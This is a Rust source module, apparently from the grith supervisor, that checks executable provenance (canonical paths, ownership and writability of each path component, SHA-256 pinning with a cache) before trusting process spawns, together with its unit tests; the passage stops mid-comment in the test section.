// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Executable provenance verification for process-spawn trust decisions.
//!
//! This module determines whether a binary at a given path is trusted for
//! auto-allow in the session allowlist. Trust is based on:
//!
//! 1. The canonical (symlink-resolved) path falls under a trusted exec root.
//! 2. The executable and its parent directory chain pass ownership and
//!    permission checks (no world-writable components).
//!
//! # Security model
//!
//! - Trust exact executables or vetted executable roots, not bare basenames.
//! - Canonicalize the executable path before trust decisions.
//! - Refuse trust for binaries in unsafe or user-untrusted writable locations.
//! - Keep process-spawn trust separate from filesystem path trust.

use grith_proxy::session_state::SessionPinnedInventory;
use grith_proxy::types::{ComponentWritability, SpawnProvenance};
use rayon::prelude::*;
use sha2::{Digest, Sha256};
use std::io::Read;
use std::os::unix::fs::MetadataExt;
use std::path::{Path, PathBuf};

use crate::inventory_cache::{stat_tag, InventoryCache};
use nix::libc;

/// Result of verifying whether an executable is trusted.
#[derive(Debug, Clone)]
pub struct ExecTrustDecision {
    /// Whether the executable is trusted for auto-allow.
    pub trusted: bool,
    /// The canonical (symlink-resolved) path, if resolution succeeded.
    pub canonical_path: Option<String>,
    /// Human-readable reason for the decision.
    pub reason: String,
}

fn canonicalize_exec_path(raw_path: &str) -> Result<PathBuf, ExecTrustDecision> {
    match std::fs::canonicalize(raw_path) {
        Ok(p) => Ok(p),
        Err(_) => Err(ExecTrustDecision {
            trusted: false,
            canonical_path: None,
            reason: format!("canonicalization failed for '{raw_path}'"),
        }),
    }
}

/// Verify whether an executable path is trusted for auto-allow based on exact
/// executable identity plus provenance (canonical path, ownership, permissions).
pub fn verify_exact_exec_provenance(raw_path: &str, trusted_execs: &[String]) -> ExecTrustDecision {
    let canonical = match canonicalize_exec_path(raw_path) {
        Ok(p) => p,
        Err(decision) => return decision,
    };
    let canonical_str = canonical.to_string_lossy().into_owned();

    if !trusted_execs.iter().any(|exec| exec == &canonical_str) {
        return ExecTrustDecision {
            trusted: false,
            canonical_path: Some(canonical_str),
            reason: "canonical path does not match any trusted exact executable".into(),
        };
    }

    match verify_path_safety(&canonical) {
        Ok(()) => ExecTrustDecision {
            trusted: true,
            canonical_path: Some(canonical_str),
            reason: "trusted exact executable".into(),
        },
        Err(reason) => ExecTrustDecision {
            trusted: false,
            canonical_path: Some(canonical_str),
            reason,
        },
    }
}

/// Verify whether an executable path is trusted for auto-allow based on a
/// trusted root plus provenance (canonical path, ownership, permissions).
pub fn verify_exec_provenance(raw_path: &str, trusted_roots: &[String]) -> ExecTrustDecision {
    let canonical = match canonicalize_exec_path(raw_path) {
        Ok(p) => p,
        Err(decision) => return decision,
    };
    let canonical_str = canonical.to_string_lossy().into_owned();

    let matched_root = trusted_roots
        .iter()
        .find(|root| is_under_root(&canonical_str, root));

    let root = match matched_root {
        Some(r) => r.clone(),
        None => {
            return ExecTrustDecision {
                trusted: false,
                canonical_path: Some(canonical_str),
                reason: "not under any trusted exec root".into(),
            };
        }
    };

    // Step 3: Verify ownership and permissions on the path chain from the
    // trusted root down to the binary.
    match verify_path_safety(&canonical) {
        Ok(()) => ExecTrustDecision {
            trusted: true,
            canonical_path: Some(canonical_str),
            reason: format!("trusted exec root '{root}'"),
        },
        Err(reason) => ExecTrustDecision {
            trusted: false,
            canonical_path: Some(canonical_str),
            reason,
        },
    }
}

/// Check if a canonical path falls under a trusted root directory.
fn is_under_root(path: &str, root: &str) -> bool {
    // Ensure root ends with '/' for proper prefix matching.
    let root_normalized = if root.ends_with('/') {
        root.to_string()
    } else {
        format!("{root}/")
    };
    path.starts_with(&root_normalized)
}

/// Verify that the executable and its parent directories are safely owned.
///
/// For each component from the filesystem root to the binary:
/// - Owner must be root (uid 0) or the current effective user.
/// - Must not be world-writable (mode & 0o002 == 0).
/// - Root-owned components must also not be group-writable (mode & 0o020 == 0),
///   since group members could inject binaries.
/// - User-owned components allow group-writable (common for nvm, Claude, etc.).
///
/// This prevents attacks where another user places a malicious binary in a
/// world-writable directory under a trusted root, while still accepting the
/// common 0o775 permissions that user-space package managers create.
fn verify_path_safety(path: &Path) -> std::result::Result<(), String> {
    let euid = unsafe { libc::geteuid() };

    // Walk each component of the path from root to the binary.
    let mut current = PathBuf::new();
    for component in path.components() {
        current.push(component);

        let metadata = match std::fs::symlink_metadata(&current) {
            Ok(m) => m,
            Err(e) => {
                return Err(format!("cannot stat '{}': {e}", current.display()));
            }
        };

        let owner = metadata.uid();
        let mode = metadata.mode();

        // Owner must be root or the current user.
        if owner != 0 && owner != euid {
            return Err(format!(
                "'{}' owned by uid {owner}, expected root or uid {euid}",
                current.display()
            ));
        }

        // Must not be world-writable (other-write bit).
        if mode & 0o002 != 0 {
            return Err(format!(
                "'{}' is world-writable (mode {mode:#o})",
                current.display()
            ));
        }

        // Root-owned components must also not be group-writable, since any
        // group member could plant a binary. User-owned components are fine
        // with 0o775 — common for nvm, mise, Claude bundled tools, etc.
        if owner == 0 && mode & 0o020 != 0 {
            return Err(format!(
                "'{}' is root-owned and group-writable (mode {mode:#o})",
                current.display()
            ));
        }
    }

    Ok(())
}

// ===========================================================================
// PR 4 Phase A — SpawnProvenance computation
// ===========================================================================

/// PR 4 Phase A: streaming SHA-256 of a file's contents. Returns the
/// 32-byte digest hex-encoded so it can be serialised directly (matches
/// `SpawnProvenance::sha256` shape).
///
/// Uses a 64 KiB buffer so large binaries don't load fully into memory.
/// Returns `Err` if the file can't be opened or read.
pub fn sha256_file(path: &Path) -> std::io::Result<String> {
    let mut file = std::fs::File::open(path)?;
    let mut hasher = Sha256::new();
    let mut buf = vec![0u8; 64 * 1024];
    loop {
        let n = file.read(&mut buf)?;
        if n == 0 {
            break;
        }
        hasher.update(&buf[..n]);
    }
    let digest = hasher.finalize();
    Ok(hex::encode(digest))
}

/// PR 4 Phase A: walk every path component from `/` down to `path`,
/// stat each one, and record writability flags. The result feeds the
/// `has_routine_signal` check in `operation_risk.rs`: if any component
/// is `other_writable`, `world_writable`, or `group_writable_non_root`,
/// the routine signal is denied.
///
/// Components that can't be stat'd (e.g. a missing intermediate dir)
/// are silently skipped — the binary itself must exist for the caller
/// to reach this function, so missing intermediate stats indicate a
/// race rather than a misconfiguration. The caller treats an
/// empty/short walk as untrusted by virtue of the missing top-level
/// component.
///
/// PRECONDITION: callers must pass a canonical path (no symlinks, no
/// `..`). `compute_spawn_provenance` enforces this via `canonicalize`
/// before calling here. Passing a non-canonical path may produce a
/// walk that describes redirected components rather than the kernel's
/// actual traversal.
pub fn compute_component_writability(path: &Path) -> Vec<ComponentWritability> {
    let mut out = Vec::new();
    let mut current = PathBuf::new();
    for component in path.components() {
        current.push(component);
        let metadata = match std::fs::symlink_metadata(&current) {
            Ok(m) => m,
            Err(_) => continue,
        };
        let mode = metadata.mode();
        let uid = metadata.uid();
        let world_writable = mode & 0o002 != 0;
        let other_writable = world_writable; // alias for clarity
        let group_writable_non_root = (mode & 0o020 != 0) && uid == 0;
        out.push(ComponentWritability {
            path: current.to_string_lossy().into_owned(),
            owner_uid: uid,
            other_writable,
            group_writable_non_root,
            world_writable,
        });
    }
    out
}

/// PR 4 Phase A: compute the full provenance metadata for a spawn
/// target. Returns `None` when the path can't be canonicalised or
/// stat'd — the caller treats that as fail-closed under taint, same
/// shape as PR 2's unknown-binary policy.
///
/// `routine_exec_roots`: profile-declared roots to test the canonical
/// path against. The first matching root is recorded; if none match,
/// `matched_routine_root` is `None` and the routine signal will be
/// denied downstream regardless of the rest.
///
/// `is_outbound_capable_fn`: callback so this crate doesn't need to
/// take a direct dep on `grith-proxy`'s outbound_binaries module. The
/// caller passes
/// `|p, argv| matches!(classify_binary(p, argv), Outbound { .. })`
/// or similar.
pub fn compute_spawn_provenance(
    raw_path: &str,
    routine_exec_roots: &[String],
    is_outbound_capable_fn: impl FnOnce(&Path) -> bool,
) -> Option<SpawnProvenance> {
    let canonical = std::fs::canonicalize(raw_path).ok()?;
    let canonical_str = canonical.to_string_lossy().into_owned();
    let metadata = std::fs::symlink_metadata(&canonical).ok()?;
    let sha256 = sha256_file(&canonical).ok()?;
    let component_writability = compute_component_writability(&canonical);
    let matched_routine_root = routine_exec_roots
        .iter()
        .find(|root| is_under_root(&canonical_str, root))
        .cloned();
    let is_outbound_capable = is_outbound_capable_fn(&canonical);
    Some(SpawnProvenance {
        canonical_path: canonical_str,
        sha256,
        owner_uid: metadata.uid(),
        owner_gid: metadata.gid(),
        mode: metadata.mode(),
        component_writability,
        matched_routine_root,
        is_outbound_capable,
    })
}

/// PR 4 Phase C — bounded walk caps. Beyond these the inventory marks
/// itself `truncated = true` and an operator-facing `tracing::warn`
/// fires so the profile can be tightened.
const INVENTORY_MAX_DEPTH: usize = 8;
const INVENTORY_MAX_FILES: usize = 5000;

/// PR 4 Phase C: walk the expanded `routine_exec_roots` and pin every
/// regular executable file as `(canonical_path, sha256-hex)`.
///
/// Each root is treated independently. For each file under a root:
///   - The file must be a regular file with at least one executable
///     bit set (`0o111`).
///   - Its full ancestor chain must be safe per
///     `compute_component_writability` (no other-writable,
///     world-writable, or root-owned-group-writable component). A
///     binary failing this check is *not* pinned. Phase D's
///     `has_routine_signal` check independently re-runs the same logic
///     at spawn time, so this is defence-in-depth, not the load-bearing
///     check.
///   - SHA-256 is computed via `sha256_file`. Errors are logged at
///     debug level and the file is skipped.
///
/// Walk is bounded by `INVENTORY_MAX_DEPTH` (relative to each root) and
/// `INVENTORY_MAX_FILES` (total across all roots). Hitting the file cap
/// short-circuits the walk and marks the inventory `truncated`.
///
/// **Symlink semantics:** directory symlinks are not descended into
/// (loop prevention). File symlinks ARE resolved via `canonicalize`,
/// which means the inventory key is the target's canonical path, not
/// the symlink path under the routine root. A file-symlink farm under
/// a routine root could therefore pin arbitrary system binaries — but
/// the canonical path's full ancestor chain must still pass the
/// `compute_component_writability` safety check (no world-/other-
/// writable or root-owned-group-writable components), which bounds the
/// blast radius to binaries whose canonical paths are already safe
/// independent of the routine root.
///
/// Returns a populated `SessionPinnedInventory` even when every root is
/// missing or empty — Phase D's signal check treats an empty inventory
/// as "no routine signal for user-owned roots", which is fail-closed.
pub fn build_session_pinned_inventory(expanded_roots: &[String]) -> SessionPinnedInventory {
    let cache = InventoryCache::open_default();
    build_session_pinned_inventory_capped(expanded_roots, INVENTORY_MAX_FILES, cache.as_ref())
}

/// Test-visible variant of [`build_session_pinned_inventory`] that
/// accepts an explicit file cap and optional cache. The public entry
/// point delegates here with `INVENTORY_MAX_FILES` + the default
/// per-user cache. Exposed as `pub(crate)` so tests can exercise the
/// truncation branch with a tiny cap and a tempdir cache.
pub(crate) fn build_session_pinned_inventory_capped(
    expanded_roots: &[String],
    max_files: usize,
    cache: Option<&InventoryCache>,
) -> SessionPinnedInventory {
    // Phase 1 (sequential, IO-bound): walk the routine roots and
    // collect candidates that pass the cheap pre-hash filters
    // (executable bit + canonicalize + component-writability). We
    // separate the walk from hashing so phase 2 can fan out across
    // CPUs via rayon — SHA-256 of 5000 files dominates the wall time.
    let (candidates, total_scanned, truncated) = collect_candidates(expanded_roots, max_files);

    // Phase 2 (parallel, CPU/IO-bound): hash each candidate, consulting
    // the persistent (mtime, size) → sha256 cache first. On a warm
    // cache this collapses to a single SQLite lookup per file with no
    // disk read beyond stat.
    let entries: Vec<(String, String)> = candidates
        .par_iter()
        .filter_map(|c| hash_candidate(c, cache))
        .collect();

    if truncated {
        tracing::warn!(
            target: "grith_supervisor::provenance",
            cap = max_files,
            "session-pinned inventory truncated at cap; tighten routine_exec_roots",
        );
    }

    let mut inv = SessionPinnedInventory::from_entries(entries);
    inv.total_scanned = total_scanned;
    inv.truncated = truncated;
    inv
}

/// Pre-hash candidate produced by phase 1. Holds everything phase 2
/// needs to either serve the cache or compute and store a fresh hash.
struct InventoryCandidate {
    canonical: PathBuf,
    canonical_str: String,
    /// stat result captured at walk time. Phase 2's cache check is
    /// keyed on `(mtime, size)`, so we avoid a second stat() call.
    tag: Option<crate::inventory_cache::StatTag>,
}

fn collect_candidates(
    expanded_roots: &[String],
    max_files: usize,
) -> (Vec<InventoryCandidate>, usize, bool) {
    let mut candidates: Vec<InventoryCandidate> = Vec::new();
    let mut truncated = false;
    let mut total_scanned: usize = 0;

    'roots: for root in expanded_roots {
        let root_path = Path::new(root);
        let mut stack: Vec<(PathBuf, usize)> = vec![(root_path.to_path_buf(), 0)];
        while let Some((dir, depth)) = stack.pop() {
            if depth > INVENTORY_MAX_DEPTH {
                continue;
            }
            let read = match std::fs::read_dir(&dir) {
                Ok(r) => r,
                Err(_) => continue,
            };
            for entry in read.flatten() {
                if total_scanned >= max_files {
                    truncated = true;
                    break 'roots;
                }
                total_scanned += 1;
                let path = entry.path();
                let metadata = match entry.metadata() {
                    Ok(m) => m,
                    Err(_) => continue,
                };
                if metadata.is_dir() {
                    if metadata.file_type().is_symlink() {
                        // Don't follow symlinked directories (loop prevention).
                        continue;
                    }
                    stack.push((path, depth + 1));
                    continue;
                }
                if !metadata.is_file() {
                    continue;
                }
                if metadata.mode() & 0o111 == 0 {
                    continue;
                }
                // canonicalize here (not symlink_metadata): symlinks
                // inside a routine root resolve to their target so the
                // inventory keys on canonical paths the supervisor will
                // also report at spawn time.
                let canonical = match std::fs::canonicalize(&path) {
                    Ok(p) => p,
                    Err(_) => continue,
                };
                let canonical_str = canonical.to_string_lossy().into_owned();
                let walk = compute_component_writability(&canonical);
                let safe = !walk
                    .iter()
                    .any(|c| c.world_writable || c.other_writable || c.group_writable_non_root);
                if !safe {
                    tracing::debug!(
                        target: "grith_supervisor::provenance",
                        path = %canonical_str,
                        "skipping inventory pin: unsafe component on path",
                    );
                    continue;
                }
                // Re-stat the canonical path: cache invariants are
                // keyed on the target's stat, not the symlink's.
                let canon_meta = std::fs::metadata(&canonical).ok();
                let tag = canon_meta.as_ref().and_then(stat_tag);
                candidates.push(InventoryCandidate {
                    canonical,
                    canonical_str,
                    tag,
                });
            }
        }
    }
    (candidates, total_scanned, truncated)
}

fn hash_candidate(
    c: &InventoryCandidate,
    cache: Option<&InventoryCache>,
) -> Option<(String, String)> {
    // Cache hit: reuse the stored hash. The (mtime, size) check in
    // `try_get` already handles invalidation, so a hit here means the
    // binary's bytes are unchanged since the last walk.
    if let (Some(tag), Some(cache)) = (c.tag, cache) {
        if let Some(hex) = cache.try_get(&c.canonical_str, tag) {
            return Some((c.canonical_str.clone(), hex));
        }
    }
    // Miss: hash the file. On success, write back to the cache so the
    // next session's walk hits it.
    match sha256_file(&c.canonical) {
        Ok(hex) => {
            if let (Some(tag), Some(cache)) = (c.tag, cache) {
                cache.put(&c.canonical_str, tag, &hex);
            }
            Some((c.canonical_str.clone(), hex))
        }
        Err(err) => {
            tracing::debug!(
                target: "grith_supervisor::provenance",
                path = %c.canonical_str,
                error = %err,
                "skipping inventory pin: sha256 read failed",
            );
            None
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_under_root_exact_prefix() {
        assert!(is_under_root(
            "/usr/lib/git-core/git-remote-http",
            "/usr/lib/git-core/"
        ));
    }

    #[test]
    fn is_under_root_without_trailing_slash() {
        assert!(is_under_root(
            "/usr/lib/git-core/git-remote-http",
            "/usr/lib/git-core"
        ));
    }

    #[test]
    fn is_under_root_not_matching() {
        assert!(!is_under_root("/usr/bin/git", "/usr/lib/git-core/"));
    }

    #[test]
    fn is_under_root_partial_name_no_match() {
        // "/usr/lib/git-core-extra/foo" should NOT match "/usr/lib/git-core/"
        assert!(!is_under_root(
            "/usr/lib/git-core-extra/foo",
            "/usr/lib/git-core/"
        ));
    }

    #[test]
    fn verify_system_binary_safety() {
        // /usr/bin/ls should pass safety checks on any reasonable system.
        let path = Path::new("/usr/bin/ls");
        if path.exists() {
            assert!(verify_path_safety(path).is_ok());
        }
    }

    #[test]
    fn verify_provenance_nonexistent() {
        let decision =
            verify_exec_provenance("/nonexistent/binary", &["/usr/lib/git-core/".into()]);
        assert!(!decision.trusted);
        assert!(decision.reason.contains("canonicalization failed"));
    }

    #[test]
    fn verify_provenance_not_under_root() {
        let decision = verify_exec_provenance("/usr/bin/ls", &["/usr/lib/git-core/".into()]);
        assert!(!decision.trusted);
        assert!(decision.reason.contains("not under any trusted exec root"));
    }

    #[test]
    fn verify_provenance_under_trusted_root() {
        // Test with a real binary under /usr/lib/git-core/ if it exists.
        let git_remote = "/usr/lib/git-core/git-remote-http";
        if Path::new(git_remote).exists() {
            let decision = verify_exec_provenance(git_remote, &["/usr/lib/git-core/".into()]);
            assert!(
                decision.trusted,
                "expected trusted, got: {}",
                decision.reason
            );
            assert!(decision.canonical_path.is_some());
        }
    }

    #[test]
    fn basename_alone_does_not_match() {
        // A relative path like "git" should not be trusted.
        let decision = verify_exec_provenance("git", &["/usr/lib/git-core/".into()]);
        // Either canonicalization fails or it doesn't match the root.
        assert!(!decision.trusted);
    }

    #[test]
    fn tmp_world_writable_rejected() {
        // /tmp is world-writable — a binary there should not be trusted.
        let decision = verify_exec_provenance("/tmp/fake-git", &["/tmp/".into()]);
        // Either the file doesn't exist (canonicalization fails) or
        // /tmp is world-writable.
        assert!(!decision.trusted);
    }

    #[test]
    fn verify_exact_exec_requires_canonical_match() {
        let decision =
            verify_exact_exec_provenance("/usr/bin/ls", &["/usr/bin/definitely-not-ls".into()]);
        assert!(!decision.trusted);
        assert!(decision.reason.contains("does not match"));
    }

    #[test]
    fn verify_exact_exec_trusts_safe_system_binary() {
        let path = "/usr/bin/ls";
        if Path::new(path).exists() {
            let decision = verify_exact_exec_provenance(path, &[path.into()]);
            assert!(
                decision.trusted,
                "expected trusted, got: {}",
                decision.reason
            );
        }
    }

    #[test]
    fn user_owned_group_writable_accepted() {
        // User-owned directories with 0o775 (group-writable) are common for
        // nvm, mise, Claude-bundled tools, etc. They should pass verification
        // because the user controls the content. Only root-owned group-writable
        // or world-writable directories are rejected.
        //
        // We place the test dir under $HOME to avoid /tmp (world-writable).
        use std::os::unix::fs::PermissionsExt;

        let home = std::env::var("HOME").unwrap();
        let dir = PathBuf::from(home).join(".cache/grith-provenance-test-775");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o775)).unwrap();

        // Create a dummy "binary" inside it
        let bin = dir.join("test-bin");
        std::fs::write(&bin, "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();

        let result = verify_path_safety(&bin);
        let _ = std::fs::remove_dir_all(&dir);

        assert!(
            result.is_ok(),
            "user-owned 0o775 dir should pass, got: {}",
            result.unwrap_err()
        );
    }

    #[test]
    fn world_writable_component_rejected() {
        // Even a user-owned directory must not be world-writable (0o777).
        use std::os::unix::fs::PermissionsExt;

        let home = std::env::var("HOME").unwrap();
        let dir = PathBuf::from(home).join(".cache/grith-provenance-test-777");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o777)).unwrap();

        let bin = dir.join("test-bin");
        std::fs::write(&bin, "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();

        let result = verify_path_safety(&bin);
        let _ = std::fs::remove_dir_all(&dir);

        assert!(result.is_err(), "world-writable dir should fail");
    }

    // PR 4 Phase A: SpawnProvenance computation tests.

    #[test]
    fn sha256_file_matches_known_input() {
        use std::io::Write;
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("hello");
        let mut f = std::fs::File::create(&path).unwrap();
        f.write_all(b"hello world").unwrap();
        // SHA-256 of "hello world" is well-known.
        let digest = sha256_file(&path).unwrap();
        assert_eq!(
            digest,
            "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9"
        );
    }

    #[test]
    fn sha256_file_returns_err_on_missing_path() {
        assert!(sha256_file(Path::new("/this/does/not/exist/abc")).is_err());
    }

    #[test]
    fn compute_component_writability_walks_full_chain() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let nested = dir.path().join("a").join("b");
        std::fs::create_dir_all(&nested).unwrap();
        let bin = nested.join("hello");
        std::fs::write(&bin, "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();

        let walk = compute_component_writability(&bin);
        // Each component from / down to /tmp/.tmpXYZ/a/b/hello should be
        // recorded. At minimum the bin's parent dir and the bin itself.
        assert!(!walk.is_empty());
        let bin_entry = walk.last().expect("walk should include the bin itself");
        assert_eq!(bin_entry.path, bin.to_string_lossy());
    }

    #[test]
    fn compute_component_writability_flags_world_writable() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let mid = dir.path().join("mid");
        std::fs::create_dir(&mid).unwrap();
        std::fs::set_permissions(&mid, std::fs::Permissions::from_mode(0o777)).unwrap();
        let bin = mid.join("hello");
        std::fs::write(&bin, "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();

        let walk = compute_component_writability(&bin);
        let world_writable = walk.iter().any(|c| c.world_writable);
        assert!(
            world_writable,
            "world-writable mid-dir must appear in the walk"
        );
    }

    #[test]
    fn compute_spawn_provenance_for_bin_sh() {
        // /bin/sh exists on essentially every Unix. Include both /bin and
        // /usr/bin in the routine roots because some distros symlink /bin
        // to /usr/bin (so /bin/sh canonicalises to /usr/bin/dash etc).
        let routine_roots = vec!["/bin".to_string(), "/usr/bin".to_string()];
        let prov = compute_spawn_provenance("/bin/sh", &routine_roots, |_| false)
            .expect("/bin/sh should canonicalise");
        assert!(!prov.canonical_path.is_empty());
        assert!(!prov.sha256.is_empty());
        assert_eq!(prov.sha256.len(), 64); // hex-encoded 32-byte digest
        assert!(!prov.component_writability.is_empty());
        assert!(
            prov.matched_routine_root.is_some(),
            "/bin/sh should match one of /bin or /usr/bin"
        );
        assert!(!prov.is_outbound_capable);
    }

    #[test]
    fn compute_spawn_provenance_none_for_missing_path() {
        let prov = compute_spawn_provenance("/this/path/does/not/exist/abc", &[], |_| false);
        assert!(prov.is_none());
    }

    #[test]
    fn compute_spawn_provenance_records_outbound_capable_flag() {
        // Use /bin/sh again — pretend it's outbound-capable for the test.
        // Include /usr/bin alongside /bin so the routine-root match
        // succeeds on distros that symlink /bin to /usr/bin (and the
        // canonical /bin/sh ends up at /usr/bin/dash).
        let routine_roots = vec!["/bin".to_string(), "/usr/bin".to_string()];
        let prov = compute_spawn_provenance("/bin/sh", &routine_roots, |_| true).unwrap();
        assert!(prov.is_outbound_capable);
        assert!(
            prov.matched_routine_root.is_some(),
            "callback should not affect routine-root matching"
        );
    }

    #[test]
    fn compute_spawn_provenance_no_matched_root_when_outside() {
        let routine_roots = vec!["/nonexistent-routine-root".to_string()];
        let prov = compute_spawn_provenance("/bin/sh", &routine_roots, |_| false).unwrap();
        assert!(prov.matched_routine_root.is_none());
    }

    // ---- PR 4 Phase C: session-pinned inventory tests ----
    //
    // Fixtures must live under $HOME, not /tmp: /tmp is world-writable
    // (mode 1777) and the inventory's component-writability check
    // correctly rejects binaries whose ancestor chain contains a
    // world-writable directory. `tempdir_in(home)` gives us an
    // auto-cleaned-up dir under HOME.

    use std::os::unix::fs::PermissionsExt;

    fn make_exec(path: &Path, content: &[u8]) {
        std::fs::write(path, content).unwrap();
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    fn tempdir_under_home() -> tempfile::TempDir {
        let home = std::env::var("HOME").expect("HOME must be set for inventory tests");
        let parent = PathBuf::from(home).join(".cache");
        std::fs::create_dir_all(&parent).unwrap();
        tempfile::tempdir_in(parent).expect("tempdir_in $HOME/.cache")
    }

    #[test]
    fn build_inventory_empty_when_no_roots() {
        let inv = build_session_pinned_inventory(&[]);
        assert!(inv.is_empty());
        assert!(!inv.truncated);
        assert_eq!(inv.total_scanned, 0);
    }

    #[test]
    fn build_inventory_skips_missing_roots() {
        let inv = build_session_pinned_inventory(&["/this/does/not/exist/pr4c/".to_string()]);
        assert!(inv.is_empty());
    }

    #[test]
    fn build_inventory_pins_executables_under_root() {
        let dir = tempdir_under_home();
        let root = dir.path();
        let bin1 = root.join("a");
        let bin2 = root.join("b");
        make_exec(&bin1, b"#!/bin/sh\necho a\n");
        make_exec(&bin2, b"#!/bin/sh\necho b\n");
        // Non-executable: must NOT be pinned.
        let plain = root.join("readme.txt");
        std::fs::write(&plain, b"hello").unwrap();

        let root_s = format!("{}/", root.display());
        let inv = build_session_pinned_inventory(&[root_s]);

        assert_eq!(inv.len(), 2, "expected 2 pinned entries: {inv:?}");
        let canonical_bin1 = std::fs::canonicalize(&bin1)
            .unwrap()
            .to_string_lossy()
            .into_owned();
        let canonical_bin2 = std::fs::canonicalize(&bin2)
            .unwrap()
            .to_string_lossy()
            .into_owned();
        assert!(inv.expected_hash(&canonical_bin1).is_some());
        assert!(inv.expected_hash(&canonical_bin2).is_some());
        let canonical_plain = std::fs::canonicalize(&plain)
            .unwrap()
            .to_string_lossy()
            .into_owned();
        assert!(inv.expected_hash(&canonical_plain).is_none());
    }

    #[test]
    fn build_inventory_walks_subdirectories_bounded() {
        let dir = tempdir_under_home();
        let root = dir.path();
        // depth 3 should be walked; build a single binary at depth 2.
        let nested = root.join("a/b");
        std::fs::create_dir_all(&nested).unwrap();
        let bin = nested.join("hello");
        make_exec(&bin, b"#!/bin/sh\n");

        let inv = build_session_pinned_inventory(&[root.to_string_lossy().into_owned()]);
        assert_eq!(inv.len(), 1);
    }

    #[test]
    fn build_inventory_truncates_when_over_cap() {
        let dir = tempdir_under_home();
        let root = dir.path();
        for i in 0..6 {
            make_exec(&root.join(format!("bin{i}")), b"#!/bin/sh\n");
        }
        // Cap at 3 to force truncation.
        let inv =
            build_session_pinned_inventory_capped(&[root.to_string_lossy().into_owned()], 3, None);
        assert!(inv.truncated, "expected truncated flag: {inv:?}");
        assert!(inv.len() <= 3);
        assert_eq!(inv.total_scanned, 3, "scanned must equal cap on truncate");
    }

    #[test]
    fn build_inventory_hashes_are_stable_and_match_sha256_file() {
        let dir = tempdir_under_home();
        let root = dir.path();
        let bin = root.join("bin1");
        make_exec(&bin, b"deterministic content");

        let inv = build_session_pinned_inventory(&[root.to_string_lossy().into_owned()]);
        let canonical = std::fs::canonicalize(&bin)
            .unwrap()
            .to_string_lossy()
            .into_owned();
        let expected = sha256_file(&bin).unwrap();
        assert_eq!(inv.expected_hash(&canonical), Some(expected.as_str()));
        assert!(inv.contains(&canonical, &expected));
        assert!(!inv.contains(&canonical, "00".repeat(32).as_str()));
    }

    // ---- Inventory hash cache integration ----

    #[test]
    fn cache_populated_on_first_walk() {
        let dir = tempdir_under_home();
        let root = dir.path();
        for i in 0..3 {
            make_exec(&root.join(format!("bin{i}")), b"some content");
        }
        let (cache, _cache_dir) = crate::inventory_cache::open_in_tempdir();

        let inv = build_session_pinned_inventory_capped(
            &[root.to_string_lossy().into_owned()],
            100,
            Some(&cache),
        );
        assert_eq!(inv.len(), 3);
        // Every hashed binary should now have a cache entry.
        assert_eq!(cache.len(), 3, "cache should hold all pinned binaries");
    }

    #[test]
    fn cache_returns_same_hashes_on_second_walk() {
        let dir = tempdir_under_home();
        let root = dir.path();
        for i in 0..3 {
            make_exec(&root.join(format!("bin{i}")), b"content {i}".as_ref());
        }
        let (cache, _cache_dir) = crate::inventory_cache::open_in_tempdir();
        let roots = vec![root.to_string_lossy().into_owned()];

        let inv1 = build_session_pinned_inventory_capped(&roots, 100, Some(&cache));
        let inv2 = build_session_pinned_inventory_capped(&roots, 100, Some(&cache));

        assert_eq!(inv1.len(), inv2.len());
        for (path, sha) in inv1.iter() {
            assert_eq!(inv2.expected_hash(path), Some(sha));
        }
    }

    #[test]
    fn cache_invalidates_when_binary_changes() {
        use std::io::Write;
        let dir = tempdir_under_home();
        let root = dir.path();
        let bin = root.join("bin0");
        make_exec(&bin, b"original");
        let (cache, _cache_dir) = crate::inventory_cache::open_in_tempdir();
        let roots = vec![root.to_string_lossy().into_owned()];

        let inv1 = build_session_pinned_inventory_capped(&roots, 100, Some(&cache));
        let canonical = std::fs::canonicalize(&bin)
            .unwrap()
            .to_string_lossy()
            .into_owned();
        let original_hash = inv1.expected_hash(&canonical).unwrap().to_string();

        // Bump mtime + content; the cache key (mtime, size) must
        // invalidate and force a re-hash.
        std::thread::sleep(std::time::Duration::from_millis(10));
        let mut f = std::fs::OpenOptions::new()
            .write(true)
            .truncate(true)
            .open(&bin)
            .unwrap();
        f.write_all(b"replaced content").unwrap();
        drop(f);

        let inv2 = build_session_pinned_inventory_capped(&roots, 100, Some(&cache));
        let new_hash = inv2.expected_hash(&canonical).unwrap();
        assert_ne!(
            new_hash, original_hash,
            "expected re-hash after binary changed"
        );
    }

    #[test]
    fn cache_is_optional() {
        // Passing None must work and produce the same result as a
        // cache-backed walk on a fresh cache.
        let dir = tempdir_under_home();
        let root = dir.path();
        for i in 0..3 {
            make_exec(&root.join(format!("bin{i}")), b"hello");
        }
        let roots = vec![root.to_string_lossy().into_owned()];
        let with_none = build_session_pinned_inventory_capped(&roots, 100, None);

        let (cache, _cache_dir) = crate::inventory_cache::open_in_tempdir();
        let with_cache = build_session_pinned_inventory_capped(&roots, 100, Some(&cache));
        assert_eq!(with_none.len(), with_cache.len());
        for (path, sha) in with_none.iter() {
            assert_eq!(with_cache.expected_hash(path), Some(sha));
        }
    }

    // ---- PR 4 Phase E: outbound-capable cross-reference ----
    //
    // Phase D wires `compute_spawn_provenance`'s callback to
    // `outbound_binaries::classify_binary`. These tests confirm the
    // cross-reference actually trips on the real curated registry —
